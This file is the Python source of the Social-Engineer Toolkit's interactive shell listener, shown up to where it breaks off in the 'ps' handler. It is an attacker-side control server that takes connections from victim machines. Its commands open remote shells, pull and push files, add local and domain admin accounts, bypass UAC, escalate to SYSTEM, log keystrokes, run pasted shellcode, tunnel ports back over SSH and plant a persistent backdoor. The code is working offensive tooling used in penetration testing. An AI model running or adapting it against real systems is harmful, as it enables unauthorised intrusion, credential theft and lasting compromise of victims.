#!/usr/bin/env python
from socket import *
import os
import threading
import sys
import re
import thread
import time
import select
import base64
import datetime
import subprocess
import binascii
from src.core.setcore import *

definepath = os.getcwd()
sys.path.append(definepath)

# cleanup
if os.path.isfile(userconfigpath + "uac.address"):
    os.remove(userconfigpath + "uac.address")
if os.path.isfile(userconfigpath + "system.address"):
    os.remove(userconfigpath + "system.address")

# will remove this later
core_modules = True

####################################################################
#                                                                  #
# The Social-Engineer Toolkit Interactive Shell Listener           #
#                                                                  #
####################################################################


def start_listener():

    # grab the operating system
    operating_system = check_os()
    # try to import readline, if not, disable tab completion
    tab_complete = True
    try:
        import readline
    # handle exception if readline isn't imported
    except ImportError:
        print("[!] python-readline is not installed, tab completion will be disabled.")
        # turn tab_complete to false and disable it
        tab_complete = False

    # specify we are using core module, need to clean this up and remove later
    core_module = True

    # allow readline tab completion
    if tab_complete == True:
        readline.parse_and_bind("tab: complete")

    HOST = ''  # bind to all interfaces

    # try command line arguments first
    try:
        PORT = int(sys.argv[1])

    # handle index error
    except IndexError:
        if check_options("PORT=") != 0:
            PORT = check_options("PORT=")

        else:
            # port number prompt for SET listener
            PORT = input(setprompt("0", "Port to listen on [443]"))
            if PORT == "":
                # if null then default to port 443
                print("[*] Defaulting to port 443 for the listener.")
                PORT = 443
                update_options("PORT=443")

        try:
            # make the port an integer
            PORT = int(PORT)
        except ValueError:
            while 1:
                print_warning("Needs to be a port number!")
                PORT = input(setprompt("0", "Port to listen on: "))
                if PORT == "":
                    PORT = 443
                    break
                try:
                    PORT = int(PORT)
                    break
                except ValueError:
                    PORT = 443
                    break

    # log error messages
    def log(error):
        # check to see if path is here
        if os.path.isfile("src/logs/"):
            # grab the date and time for now
            now = datetime.datetime.today()
            # all error messages will be posted in set_logfile.txt
            filewrite = open("src/logs/set_logfile.log", "a")
            filewrite.write(now + error + "\r\n")
            filewrite.close()

    # specify it as nothing until we make it past our encryption check
    try:

        from Crypto.Cipher import AES

        # set encryption key to 1
        encryption = 1

        print_status(
            "Crypto.Cipher library is installed. AES will be used for socket communication.")
        print_status(
            "All communications will leverage AES 256 and randomized cipher-key exchange.")
        # the block size for the cipher object; must be 16, 24, or 32 for AES
        BLOCK_SIZE = 32

        # the character used for padding--with a block cipher such as AES, the value
        # you encrypt must be a multiple of BLOCK_SIZE in length.  This character is
        # used to ensure that your value is always a multiple of BLOCK_SIZE
        PADDING = '{'

        # one-liner to sufficiently pad the text to be encrypted
        pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING

        # one-liners to encrypt/encode and decrypt/decode a string
        # encrypt with AES, encode with base64
        EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
        DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)

        # generate a random secret key
        secret = os.urandom(BLOCK_SIZE)

        # create a cipher object using the random secret
        cipher = AES.new(secret)

    # if it isn't import then trigger error and turn off encryption
    except ImportError:
        # this means that python-crypto is not installed and we need to set the
        # encryption flag to 0, which turns off communications
        encryption = 0
        print_warning(
            "Crypto.Cipher python module not detected. Disabling encryption.")
        if operating_system != "windows":
            print_warning(
                "If you want encrypted communications download from here: http://ftp.dlitz.net/pub/dlitz/crypto/pycrypto/pycrypto-2.3.tar.gz")
            print_warning(
                "Or if your on Ubuntu head over to: http://packages.ubuntu.com/search?keywords=python-crypto")
            print_warning(
                "Or you can simply type apt-get install python-crypto or in Back|Track apt-get install python2.5-crypto")

    # universal exit message
    def exit_menu():
        print("\n[*] Exiting the Social-Engineer Toolkit (SET) Interactive Shell.")

    mysock = socket.socket(AF_INET, SOCK_STREAM)
    mysock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
    addr = (HOST, PORT)
    try:
        mysock.bind(addr)
        mysock.listen(100000)
    except Exception as error:
        if core_modules == True:
            log(error)
            print_error(
                "ERROR:Unable to bind to listener port, do you have something else listening?")
            sys.exit()  # exit_set()
        if core_modules == False:
            sys.exit("[!] Unable to bind to interfact. Try again.")

    # base count handler
    count = 0

    # send packet is used to determine if encryption is in use or not
    def send_packet(message, conn, encryption):

        # we put a try/except block here in case of socket error. if it has an exception
        # here, it would completely kill the session. we want to make it as stable as possible even
        # after error.
        try:

            # if encryption is enabled then send this
            if encryption == 1:

                # we encrypt our output here
                encoded = EncodeAES(cipher, message)
                # we take the length of the encrypted string
                normal_size = len(encoded)
                # we turn the length of our string into a string literal
                normal_size = str(normal_size)
                # we encrypt our string literal
                normal_size_crypt = EncodeAES(cipher, normal_size)
                # we send our encrypted string literal to let our server know h$
                # true encrypted string is
                conn.send(str(normal_size_crypt))
                time.sleep(0.3)
                # we send our encrypted string
                conn.send(str(encoded))

            # if encryption is disabled then send this
            if encryption == 0:
                message_size = str(len(message))
                conn.send(message_size)
                conn.send(str(message))

        # handle exceptions
        except Exception as e:
            print_warning(
                "An exception occured. Handling it and keeping session alive. Error: " + str(e))
            pass

    # decrypt received packets
    def decrypt_packet(message, encryption):
        # try/except block to keep socket alive
        try:

            # if encrypt then decode
            if encryption == 1:
                return DecodeAES(cipher, message)

            # if not encrypted then return result
            if encryption == 0:
                return message

        # handle exceptions
        except Exception as e:
            print_warning(
                "An exception occured. Handling it and keeping session alive. Error: " + str(e))
            pass

    # handle tab completion here for set interactive menu
    class Completer:

        def __init__(self):
            if operating_system == "windows":
                self.words = ["shell", "localadmin", "help", "?", "domainadmin", "ssh_tunnel", "bypassuac", "lockworkstation", "grabsystem", "download",
                              "upload", "ps", "kill", "keystroke_start", "keystroke_dump", "reboot", "persistence", "removepersistence", "shellcode", "cls", "clear"]
            if operating_system == "posix":
                self.words = ["shell", "help", "?", "ssh_tunnel",
                              "download", "upload", "reboot", "cls", "clear"]
            self.prefix = None

        def complete(self, prefix, index):
            if prefix != self.prefix:
                self.matching_words = [
                    w for w in self.words if w.startswith(prefix)]
                self.prefix = prefix
            else:
                pass
            try:
                return self.matching_words[index]
            except IndexError:
                return None

    # handle tab completion here for initial choice selection
    class Completer2:

        def __init__(self):
            self.words = []
            self.prefix = None

        def complete(self, prefix, index):
            if prefix != self.prefix:
                self.matching_words = [
                    w for w in self.words if w.startswith(prefix)]
                self.prefix = prefix
            else:
                pass
            try:
                return self.matching_words[index]
            except IndexError:
                return None

    # main socket handler
    def handle_connection(conn, addr, encryption, operating_system):

        print_status(
            "Dropping into the Social-Engineer Toolkit Interactive Shell.")

        # put an exceptions block in here
        try:

            # if we are leveraging encryption
            if encryption == 1:
                # generate a random 52 character string
                random_string = os.urandom(52)
                data = conn.send(random_string)
                # confirm that we support encryption
                data = conn.recv(1024)
                if data == random_string:
                    # This method isn't probably the most desirable since it can
                    # be intercepted and unhex'd during transmission. Provides a
                    # good level of encryption unless the ciphertext is used as the
                    # AES decryption string. This is a first pass, will improve over
                    # time. Could hardcode keys on server/client but would have an
                    # even less desirable effect. Overall, solution will be to use
                    # pub/private RSA certs
                    secret_send = binascii.hexlify(secret)
                    conn.send(secret_send)

                # if we didn't receive the confirmation back then we don't
                # support encryption

                else:
                    encryption = 0

            # if we aren't using encryption then tell the victim
            if encryption == 0:
                # generate a random 51 character string
                random_string = os.urandom(51)
                conn.send(random_string)
                # acknowledge encryption has been disabled
                data = conn.recv(51)
                # decrypt the data if applicable
                data = decrypt_packet(data, encryption)

        except Exception as e:
            print(e)
            print_warning(
                "Looks like the session died. Dropping back into selection menu.")
            return_continue()
            global count
            count = 2
            garbage1 = ""
            garbage2 = ""
            garbage3 = ""
            thread.start_new_thread(
                call_connections, (d, garbage1, garbage2, garbage3))
            sys.exit()  # exit_set()

        # initial try loop to catch keyboard interrupts and exceptions
        try:

            # start initial loop for menu
            while 1:
                # main SET menu
                if tab_complete == True:
                    completer = Completer()
                    readline.set_completer(completer.complete)
                data = input(setprompt(["25"], ""))

                # if data is equal to quit or exit then break out of loop and
                # exit
                if data == "quit" or data == "exit" or data == "back":
                    print_warning("Dropping back to list of victims.\n")
                    send_packet("quit", conn, encryption)
                    break

                if data == "cls" or data == "clear":
                    os.system("clear")

                # if user specifies help do this
                if data == "help" or data == "?":

                    print("Welcome to the Social-Engineer Toolkit Help Menu.\n\nEnter the following commands for usage:")

                    # universal commands
                    if operating_system == "posix" or operating_system == "windows":
                        print("""
Command: shell
Explanation: drop into a command shell
Example: shell

Command: download <path_to_file>
Explanation: downloads a file locally to the SET root directory.
Example: download C:\\boot.ini or download /etc/passwd

Command: upload <path_to_file_on_attacker> <path_to_write_on_victim>
Explanation: uploads a file to the victim system
Example: upload /root/nc.exe C:\\nc.exe or upload /root/backdoor.sh /root/backdoor.sh

Command: ssh_tunnel <attack_ip> <attack_ssh_port> <attack_tunnelport> <user> <pass> <tunnel_port>
Explanation: This module tunnels ports from the compromised victims machine back to your machine.
Example: ssh_tunnel publicipaddress 22 80 root complexpassword?! 80

Command: exec <command>
Explanation: Execute a command on your LOCAL 'attacker' machine.
Example exec ls -al

Command: ps
Explanation: List running processes on the victim machine.
Example: ps

Command: kill <pid>
Explanation: Kill a process based on process ID (number) returned from ps.
Example: kill 3143

Command: reboot now
Explanation: Reboots the remote server instantly.
Example: reboot now""")
                    # if we're running under windows
                    if operating_system == "windows":
                        print("""
Command: localadmin <username> <password>
Explanation: adds a local admin to the system
Example: localadmin bob p@55w0rd!

Command: domainadmin <username> <password>
Explanation: adds a local admin to the system
Example: domainadmin bob p@55w0rd!

Command: bypassuac <ipaddress_of_listener> <port_of_listener> <x86 or x64>
Explanation: Trigger another SET interactive shell with the UAC safe flag
Example bypassuac 172.16.32.128 443 x64

Command: grabsystem <ipaddress_of_listener> <port_of_listener>
Explanation: Uploads a new set interactive shell running as a service and as SYSTEM.
Caution: If using on Windows 7 with UAC enabled, run bypassuac first before running this.
Example: grabsystem 172.16.32.128 443

Command: keystroke_start
Explanation: Starts a keystroke logger on the victim machine. It will stop when shell exits.
Example: keystroke_start

Command: keystroke_dump
Explanation: Dumps the information from the keystroke logger. You must run keystroke_start first.
Example: keystroke_dump

Command: lockworkstation
Explanation: Will lock the victims workstation forcing them to log back in. Useful for capturing keystrokes.
Example: lockworkstation

Command: persistence <ipaddress_of_listener> <port_of_listener>
Explanation: Persistence will spawn a SET interactive shell every 30 minutes on the victim machine.
Example: persistence 172.16.32.128 443
Warning: Will not work with UAC enabled *yet*.

Command: removepersistence
Explanation: Will remove persistence from the remote victim machine.
Example: removepersistence

Command: shellcode
Explanation: This will execute native shellcode on the victim machine through python.
Example: shellcode <enter> - Then paste your shellcode \x41\x41\etc
""")
                try:
                    # base counter to see if command is invalid
                    base_counter = 0

                    # do a quick search to execute a local command
                    match = re.search("exec", data)
                    if match:

                        # trigger we hit
                        base_counter = 1

                        # define temp_data to test if we have more than one
                        # command other than exec
                        temp_data = data.split(" ")

                        # remove the exec name from the command
                        data = data.replace("exec ", "")
                        # grab the command
                        command = data
                        # assign data to exec for handler below
                        data = "exec"

                        # see if we have a value, if not through an indexerror
                        data = "exec test"
                        data = data.split(" ")
                        temp_data = temp_data[1]
                        data = "exec"

                    # split into tuple in case localadmin is used

                    data = data.split(" ")
                    # if data[0] is localadmin then split up the creds and data
                    if data[0] == "localadmin":
                        creds = "%s,%s" % (data[1], data[2])
                        data = "localadmin"
                        base_counter = 1

                    # if data[0] is domainadmin then split up the creds and
                    # data
                    if data[0] == "domainadmin":
                        creds = "%s,%s" % (data[1], data[2])
                        data = "domainadmin"
                        base_counter = 1

                    # if data[0] is equal to shell then go to normal
                    if data[0] == "shell":
                        base_counter = 1
                        data = data[0]

                    # if data[0] is equal to download
                    if data[0] == "download":
                        # assign download_path
                        download_path = data[1]
                        # assign data[0]
                        data = data[0]
                        base_counter = 1

                    # if data[0] is equal to ssh_port_forward then use port
                    # forwarding
                    if data[0] == "ssh_tunnel":
                        # IP of the SSH server
                        ssh_server_ip = data[1]
                        # PORT of the SSH server
                        ssh_server_port_address = data[2]
                        # PORT to use on localhost for tunneled protcol
                        ssh_server_tunnel_port = data[3]
                        # username for SSH server
                        ssh_server_username = data[4]
                        # password for SSH server
                        ssh_server_password = data[5]
                        # PORT to forward from victim
                        victim_server_port = data[6]
                        # specify data as ssh_port_tunnel
                        data = data[0]
                        base_counter = 1

                    # if data[0] is equal to upload_file
                    if data[0] == "upload":
                        # assign executable path to upload
                        upload = data[1]
                        # assign path to write file on opposite side
                        write_path = data[2]
                        # assign data[0]
                        data = data[0]
                        base_counter = 1

                    # bypassuac
                    if data[0] == "bypassuac":
                        # ipaddress and port
                        ipaddress = data[1] + " " + data[2]
                        exe_platform = data[3]
                        data = data[0]
                        base_counter = 1

                    # persistence
                    if data[0] == "persistence":
                        ipaddress = data[1] + " " + data[2]
                        data = data[0]
                        base_counter = 1

                    if data[0] == "removepersistence":
                        base_counter = 1
                        data = data[0]

                    if data[0] == "keystroke_start":
                        data = "keystroke_start"
                        base_counter = 1

                    if data[0] == "keystroke_dump":
                        data = "keystroke_dump"
                        base_counter = 1

                    # grabsystem
                    if data[0] == "grabsystem":
                        # define ipaddress
                        ipaddress = data[1] + " " + data[2]
                        data = data[0]
                        base_counter = 1

                    # lock workstation
                    if data[0] == "lockworkstation":
                        data = "lockworkstation"
                        base_counter = 1

                    # if data[0] is equal to ps
                    if data[0] == "ps":
                        data = "ps"
                        base_counter = 1

                    # if data[0] is equal to reboot
                    if data[0] == "reboot":
                        if data[1] == "now":
                            data = "reboot now"
                            base_counter = 1

                    # if data[0] is equal kill
                    if data[0] == "kill":
                        pid_number = data[1]
                        data = "kill"
                        base_counter = 1

                    # if data[0] is equal to exec
                    if data[0] == "exec":
                        data = "exec"
                        base_counter = 1

                    # shellcodeexec
                    if data[0] == "shellcode":
                        shellcode_inject = input(
                            "Paste your shellcode into here: ")
                        shellcode_inject = shellcode_inject.decode(
                            "string_escape")
                        data = "shellcode"
                        base_counter = 1

                    if data[0] == "help" or data[0] == "?":
                        base_counter = 1

                    if data[0] == "":
                        base_counter = 1
                    if data[0] == "cls" or data[0] == "clear":
                        base_counter = 1

                    if base_counter == 0:
                        print("[!] The command was not recognized.")

                # handle range errors and throw correct syntax
                except IndexError:
                    if data[0] == "kill":
                        print("[!] Usage: kill <pid_id>")
                    if data[0] == "exec":
                        print("[!] Usage: exec <command>")
                    if data[0] == "bypassuac":
                        print("[!] Usage: bypassuac <set_reverse_listener_ip> <set_port> <x64 or x86>")
                    if data[0] == "upload":
                        print("[!] Usage: upload <filename> <path_on_victim>")
                    if data[0] == "download":
                        print("[!] Usage: download <filename>")
                    if data[0] == "ssh_tunnel":
                        print("[!] Usage: ssh_tunnel <attack_ip> <attack_ssh_port> <attack_tunnelport> <user> <pass> <tunnel_port>")
                    if data[0] == "domainadmin":
                        print("[!] Usage: domainadmin <username> <password>")
                    if data[0] == "localadmin":
                        print("[!] Usage: localadmin <username> <password>")
                    if data[0] == "grabsystem":
                        print("[!] Usage: grabsystem <ipaddress_of_listener> <port_of_listener>")
                    if data[0] == "reboot":
                        print("[!] Usage: reboot now")
                    if data[0] == "persistence":
                        print("[!] Usage: persistence <set_reverse_listener_ip> <set_port>")
                    if data[0] == "shellcode":
                        print("[!] Usage: shellcode <paste shellcode>")

                # in case of an attribute error just pass and restart
                except AttributeError as e:
                        # write to log file then pass
                    log(e)
                    pass

                # handle the rest of errors
                except Exception as e:
                    print("[!] Something went wrong, printing error: " + str(e))
                    log(e)
                    garbage1 = ""
                    garbage2 = ""
                    garbage3 = ""
                    thread.start_new_thread(
                        call_connections, (d, garbage1, garbage2, garbage3))
                    sys.exit()

                # if data is equal to shell
                if data == "shell":
                    send_packet(data, conn, encryption)
                    print("[*] Entering a Windows Command Prompt. Enter your commands below.\n")
                    while 1:
                        try:
                            # accept raw input
                            data = input(setprompt(["25", "26"], ""))
                            # if we specify exit or quit then get out
                            if data == "exit" or data == "quit" or data == "back":
                                print("[*] Dropping back to interactive shell... ")
                                send_packet(data, conn, encryption)
                                break
                            if data != "":
                                send_packet(data, conn, encryption)

                                # this will receive length of data socket we
                                # need
                                data = conn.recv(1024)
                                # decrypt the data length
                                data = decrypt_packet(data, encryption)

                                # here is an ugly hack but it works, basically we set two
                                # counters. MSGLEN which will eventually equal the length
                                # of what number was sent to us which represented the length
                                # of the output of the shell command we executed. Dataout
                                # will eventually equal the entire string loaded into our
                                # buffer then sent for decryption.
                                #
                                # A loop is started which continues to receive until we hit
                                # the length of what our entire full encrypted shell output
                                # is equaled. Once that occurs, we are out of our loop and
                                # the full string is sent to the decryption routine and
                                # presented back to us.

                                MSGLEN = 0
                                dataout = ""
                                length = int(data)
                                while 1:
                                    data = conn.recv(1024)
                                    if not data:
                                        break
                                    dataout += data
                                    MSGLEN = MSGLEN + len(data)
                                    if MSGLEN == int(length):
                                        break

                                # decrypt our command line output
                                data = decrypt_packet(dataout, encryption)
                                # display our output
                                print(data)

                        # handle error generally means base 10 error message which means there
                        # was no response. Socket probably died somehow.
                        except ValueError as e:
                            # write to log file
                            log(e)
                            print("[!] Response back wasn't expected. The session probably died.")
                            garbage1 = ""
                            garbage2 = ""
                            garbage3 = ""
                            thread.start_new_thread(
                                call_connections, (d, garbage1, garbage2, garbage3))
                            sys.exit()  # exit_set()

                # if data is equal to localadmin then flag and add a local user
                # account
                if data == "localadmin":
                    print("[*] Attempting to add a user account with administrative permissions.")
                    send_packet(data, conn, encryption)
                    send_packet(creds, conn, encryption)
                    print("[*] User add completed. Check the system to ensure it worked correctly.")

                # if data is equal to domainadmin then flag and add a local
                # admin account
                if data == "domainadmin":
                    print("[*] Attempting to add a user account with domain administrative permissions.")
                    send_packet(data, conn, encryption)
                    send_packet(creds, conn, encryption)
                    print("[*] User add completed. Check the system to ensure it worked correctly.")

                # keystroke logger
                if data == "keystroke_start":
                    send_packet(data, conn, encryption)
                    print("[*] Keystroke logger has been started on the victim machine")

                # dump the data
                if data == "keystroke_dump":
                    send_packet(data, conn, encryption)
                    data = conn.recv(1024)
                    data = decrypt_packet(data, encryption)
                    data = conn.recv(int(data))
                    data = decrypt_packet(data, encryption)
                    print(data)

                # if data is equal to download
                if data == "download":

                    # trigger our shell to go in downloadfile mode
                    data = "downloadfile"

                    # send that we are in downloadfile mode
                    send_packet(data, conn, encryption)

                    # send our file path
                    send_packet(download_path, conn, encryption)

                    # mark a flag for write
                    download_path = download_path.replace("\\", "_")
                    download_path = download_path.replace("/", "_")
                    download_path = download_path.replace(":", "_")
                    filewrite = open(download_path, "wb")

                    # start a loop until we are finished getting data

                    # recv data
                    data = conn.recv(1024)
                    data = decrypt_packet(data, encryption)

                    # here is an ugly hack but it works, basically we set two
                    # counters. MSGLEN which will eventually equal the length
                    # of what number was sent to us which represented the length
                    # of the output of the file.
                    # Dataout will eventually equal the entire string loaded into our
                    # buffer then sent for decryption.
                    #
                    # A loop is started which continues to receive until we hit
                    # the length of what our entire full encrypted file output
                    # is equaled. Once that occurs, we are out of our loop and
                    # the full string is sent to the decryption routine and
                    # presented back to us.

                    MSGLEN = 0
                    dataout = ""
                    length = int(data)
                    while MSGLEN != length:
                        data = conn.recv(1024)
                        dataout += data
                        MSGLEN = MSGLEN + len(data)

                    data = decrypt_packet(data, encryption)

                    # if the file wasn't right
                    if data == "File not found.":
                        print("[!] Filename was not found. Try again.")
                        break

                    if data != "File not found.":
                        # write the data to file
                        filewrite.write(data)
                        filewrite.close()
                        # grab our current path
                        definepath = os.getcwd()
                        print("[*] Filename: %s successfully downloaded." % (download_path))
                        print("[*] File stored at: %s/%s" % (definepath, download_path))

                # lock workstation
                if data == "lockworkstation":
                    print("[*] Sending the instruction to lock the victims workstation...")
                    send_packet(data, conn, encryption)
                    print("[*] Victims workstation has been locked...")

                # grabsystem
                if data == "grabsystem":

                    data = "getsystem"

                    # send that we want to upload a file to the victim
                    # controller
                    send_packet(data, conn, encryption)

                    time.sleep(0.5)

                    write_path = "not needed"

                    send_packet(write_path, conn, encryption)

                    # specify null variable to store our buffer for our file
                    data_file = ""

                    if os.path.isfile("src/payloads/set_payloads/shell.windows"):
                        upload = "src/payloads/set_payloads/shell.windows"

                    if os.path.isfile("shell.windows"):
                        upload = "shell.windows"

                    if os.path.isfile(upload):
                        fileopen = open(upload, "rb")

                        print("[*] Attempting to upload interactive shell to victim machine.")

                        # open file for reading
                        data_file = fileopen.read()
                        fileopen.close()

                        # send the file line by line to the system
                        send_packet(data_file, conn, encryption)

                        # receive length of confirmation
                        data = conn.recv(1024)
                        # decrypt the confirmation
                        data = decrypt_packet(data, encryption)
                        # now receive confirmation
                        data = conn.recv(int(data))
                        # encrypt our confirmation or failed upload
                        data = decrypt_packet(data, encryption)

                        # if we were successful
                        if data == "Confirmed":
                            print("[*] SET Interactive shell successfully uploaded to victim.")

                        # if we failed
                        if data == "Failed":
                            print("[!] File had an issue saving to the victim machine. Try Again?")

                    # delay 5 seconds
                    time.sleep(0.5)

                    # write out system
                    if os.path.isfile("%s/system.address" % (userconfigpath)):
                        os.remove("%s/system.address" % (userconfigpath))
                    filewrite = open("%s/system.address" % (userconfigpath), "w")
                    filewrite.write(addr)
                    filewrite.close()

                    # send the ipaddress and port for reverse connect back
                    send_packet(ipaddress, conn, encryption)

                    print("[*] You should have a new shell spawned that is running as SYSTEM in a few seconds...")

                # bypassuac
                if data == "bypassuac":

                    # define uac string

                    # had to do some funky stuff here because global vars are not working properly
                    # inside threads, so the information cant be passed to
                    # normal outside routines
                    if os.path.isfile(userconfigpath + "uac.address"):
                        os.remove(userconfigpath + "uac.address")
                    filewrite = open(userconfigpath + "uac.address", "w")
                    filewrite.write(addr)
                    filewrite.close()

                    # send that we want to upload a file to the victim
                    # controller
                    send_packet(data, conn, encryption)

                    time.sleep(0.5)

                    # now that we're inside that loop on victim we need to give it parameters
                    # we will send the write_path to the victim to prep the
                    # filewrite

                    write_path = "not needed"

                    # send packet over
                    send_packet(write_path, conn, encryption)

                    # specify null variable to store our buffer for our file
                    data_file = ""

                    if exe_platform == "x64":
                        if os.path.isfile("src/payloads/set_payloads/uac_bypass/x64.binary"):
                            upload = "src/payloads/set_payloads/uac_bypass/x64.binary"

                        if os.path.isfile("uac_bypass/x64.binary"):
                            upload = "uac_bypass/x64.binary"

                    if exe_platform == "x86":
                        if os.path.isfile("src/payloads/set_payloads/uac_bypass/x86.binary"):
                            upload = "src/payloads/set_payloads/uac_bypass/x86.binary"
                        if os.path.isfile("uac_bypass/x86.binary"):
                            upload = "uac_bypass/x86.binary"

                    if os.path.isfile(upload):
                        fileopen = open(upload, "rb")

                        print("[*] Attempting to upload UAC bypass to the victim machine.")
                        # start a loop
                        data_file = fileopen.read()
                        fileopen.close()

                        # send the file line by line to the system
                        send_packet(data_file, conn, encryption)

                        # receive length of confirmation
                        data = conn.recv(1024)
                        # decrypt the confirmation
                        data = decrypt_packet(data, encryption)
                        # now receive confirmation
                        data = conn.recv(int(data))
                        # encrypt our confirmation or failed upload
                        data = decrypt_packet(data, encryption)

                        # if we were successful
                        if data == "Confirmed":
                            print("[*] Initial bypass has been uploaded to victim successfully.")

                        # if we failed
                        if data == "Failed":
                            print("[!] File had an issue saving to the victim machine. Try Again?")

                    time.sleep(0.5)

                    # now that we're inside that loop on victim we need to give it parameters
                    # we will send the write_path to the victim to prep the
                    # filewrite

                    send_packet(write_path, conn, encryption)

                    # specify null variable to store our buffer for our file
                    data_file = ""

                    if os.path.isfile("src/payloads/set_payloads/shell.windows"):
                        upload = "src/payloads/set_payloads/shell.windows"

                    if os.path.isfile("shell.windows"):
                        upload = "shell.windows"

                    if os.path.isfile(upload):
                        fileopen = open(upload, "rb")

                        print("[*] Attempting to upload interactive shell to victim machine.")

                        # start a loop
                        data_file = fileopen.read()

                        fileopen.close()

                        # send the file line by line to the system
                        send_packet(data_file, conn, encryption)

                        # receive length of confirmation
                        data = conn.recv(1024)
                        # decrypt the confirmation
                        data = decrypt_packet(data, encryption)
                        # now receive confirmation
                        data = conn.recv(int(data))
                        # encrypt our confirmation or failed upload
                        data = decrypt_packet(data, encryption)

                        # if we were successful
                        if data == "Confirmed":
                            print("[*] SET Interactive shell successfully uploaded to victim.")

                        # if we failed
                        if data == "Failed":
                            print("[!] File had an issue saving to the victim machine. Try Again?")

                    send_packet(ipaddress, conn, encryption)
                    print("[*] You should have a new shell spawned that is UAC safe in a few seconds...")

                # remove persistence
                if data == "removepersistence":
                    print("[*] Telling interactive shell to remove persistence from startup.")
                    send_packet(data, conn, encryption)
                    print("[*] Service has been scheduled for deletion. It may take a reboot or when the 30 minute loop is finished.")

                # persistence
                if data == "persistence":

                    # we place a try except block here, if UAC is enabled
                    # persistence fails for now

                    try:

                        # send that we want to upload a file to the victim
                        # controller for persistence
                        send_packet(data, conn, encryption)

                        time.sleep(0.5)

                        # now that we're inside that loop on victim we need to give it parameters
                        # we will send the write_path to the victim to prep the
                        # filewrite

                        write_path = "not needed"

                        # send packet over
                        send_packet(write_path, conn, encryption)

                        # specify null variable to store our buffer for our
                        # file
                        data_file = ""

                        if os.path.isfile("src/payloads/set_payloads/persistence.binary"):
                            if core_modules == True:
                                subprocess.Popen(
                                    "cp src/payloads/set_payloads/persistence.binary %s" % (userconfigpath), shell=True).wait()
                                upx("%s/persistence.binary" % (userconfigpath))
                                upload = "%s/persistence.binary" % (userconfigpath)
                            if core_modules == False:
                                upload = "src/payloads/set_payloads/persistence.binary"

                        if os.path.isfile("persistence.binary"):
                            upload = "persistence.binary"

                        if os.path.isfile(upload):
                            fileopen = open(upload, "rb")

                            print("[*] Attempting to upload the SET Interactive Service to the victim.")
                            # start a loop
                            data_file = fileopen.read()
                            fileopen.close()

                            # send the file line by line to the system
                            send_packet(data_file, conn, encryption)

                            # receive length of confirmation
                            data = conn.recv(1024)
                            # decrypt the confirmation
                            data = decrypt_packet(data, encryption)
                            # now receive confirmation
                            data = conn.recv(int(data))
                            # encrypt our confirmation or failed upload
                            data = decrypt_packet(data, encryption)

                            # if we were successful
                            if data == "Confirmed":
                                print("[*] Initial service has been uploaded to victim successfully.")

                            # if we failed
                            if data == "Failed":
                                print("[!] File had an issue saving to the victim machine. Try Again?")

                        time.sleep(0.5)

                        # now that we're inside that loop on victim we need to give it parameters
                        # we will send the write_path to the victim to prep the
                        # filewrite

                        send_packet(write_path, conn, encryption)

                        # specify null variable to store our buffer for our
                        # file
                        data_file = ""

                        if os.path.isfile("src/payloads/set_payloads/shell.windows"):
                            if core_modules == True:
                                subprocess.Popen(
                                    "cp src/payloads/set_payloads/shell.windows %s" % (userconfigpath), shell=True).wait()
                                upx(userconfigpath + "shell.windows")
                                upload = userconfigpath + "shell.windows"
                            if core_modules == False:
                                upload = "src/payloads/set_payloads/shell.windows"

                        if os.path.isfile("shell.windows"):
                            upload = "shell.windows"

                        if os.path.isfile(upload):
                            fileopen = open(upload, "rb")

                            print("[*] Attempting to upload SET Interactive Shell to victim machine.")

                            # start a loop
                            data_file = fileopen.read()

                            fileopen.close()

                            # send the file line by line to the system
                            send_packet(data_file, conn, encryption)

                            # receive length of confirmation
                            data = conn.recv(1024)
                            # decrypt the confirmation
                            data = decrypt_packet(data, encryption)
                            # now receive confirmation
                            data = conn.recv(int(data))
                            # encrypt our confirmation or failed upload
                            data = decrypt_packet(data, encryption)

                            # if we were successful
                            if data == "Confirmed":
                                print("[*] SET Interactive shell successfully uploaded to victim.")

                            # if we failed
                            if data == "Failed":
                                print("[!] File had an issue saving to the victim machine. Try Again?")

                        send_packet(ipaddress, conn, encryption)
                        print("[*] Service has been created on the victim machine. You should have a connection back every 30 minutes.")

                    except Exception:
                        print("[!] Failed to create service on victim. If UAC is enabled this will fail. Even with bypassUAC.")

                # if data is equal to upload
                if data == "upload":

                    # trigger our shell to go in downloadfile mode
                    data = "uploadfile"

                    # send that we want to upload a file to the victim
                    # controller
                    send_packet(data, conn, encryption)

                    time.sleep(0.5)

                    # now that we're inside that loop on victim we need to give it parameters
                    # we will send the write_path to the victim to prep the
                    # filewrite
                    send_packet(write_path, conn, encryption)

                    # specify null variable to store our buffer for our file
                    data_file = ""

                    if os.path.isfile(upload):
                        fileopen = open(upload, "rb")

                        print("[*] Attempting to upload %s to %s on victim machine." % (upload, write_path))
                        # start a loop
                        data_file = fileopen.read()
                        fileopen.close()

                        # send the file line by line to the system
                        send_packet(data_file, conn, encryption)

                        # receive length of confirmation
                        data = conn.recv(1024)
                        # decrypt the confirmation
                        data = decrypt_packet(data, encryption)
                        # now receive confirmation
                        data = conn.recv(int(data))
                        # encrypt our confirmation or failed upload
                        data = decrypt_packet(data, encryption)

                        # if we were successful
                        if data == "Confirmed":
                            print("[*] File has been uploaded to victim under path: " + write_path)

                        # if we failed
                        if data == "Failed":
                            print("[!] File had an issue saving to the victim machine. Try Again?")

                    # if file wasn't found
                    else:
                        print("[!] File wasn't found. Try entering the path again.")

                # if data == ssh_port_tunnel
                if data == "ssh_tunnel":

                    # let the server know it needs to switch to paramiko mode
                    data = "paramiko"
                    print("[*] Telling the victim machine we are switching to SSH tunnel mode..")
                    # send encrypted packet to victim
                    send_packet(data, conn, encryption)
                    # receive length of confirmation
                    data = conn.recv(1024)
                    # decrypt the confirmation
                    data = decrypt_packet(data, encryption)
                    # now receive confirmation
                    data = conn.recv(int(data))
                    # decrypt packet
                    data = decrypt_packet(data, encryption)
                    if data == "Paramiko Confirmed.":
                        print("[*] Acknowledged the server supports SSH tunneling..")
                        # send all the data over
                        data = ssh_server_ip + "," + ssh_server_port_address + "," + ssh_server_tunnel_port + \
                            "," + ssh_server_username + "," + ssh_server_password + "," + victim_server_port
                        # encrypt the packet and send it over
                        send_packet(data, conn, encryption)
                        print("[*] Tunnel is establishing, check IP Address: " + ssh_server_ip + " on port: " + ssh_server_tunnel_port)
                        print("[*] As an example if tunneling RDP you would rdesktop localhost 3389")

                # list running processes
                if data == "ps":
